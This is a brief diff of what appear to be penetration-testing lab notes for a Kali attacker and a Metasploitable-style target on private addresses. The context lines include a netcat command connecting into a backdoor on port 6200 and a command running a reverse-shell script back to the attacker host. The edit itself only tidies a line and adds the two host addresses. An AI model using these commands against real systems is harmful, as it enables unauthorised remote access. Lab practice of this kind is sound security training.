@@ -18,4 +18,6 @@ kali-CMD5  nc 192.168.1.100 6200                          #Connecting into the b
 
            python reverseShell.py 192.168.1.101 &         #It will now connect to the server
 
-[cat displays the file in CMD] Example: cat reverseShell.py       [
+[cat displays the file in CMD] Example: cat reverseShell.py
+
+Kali 192.168.1.101                    Meta 192.168.1.100
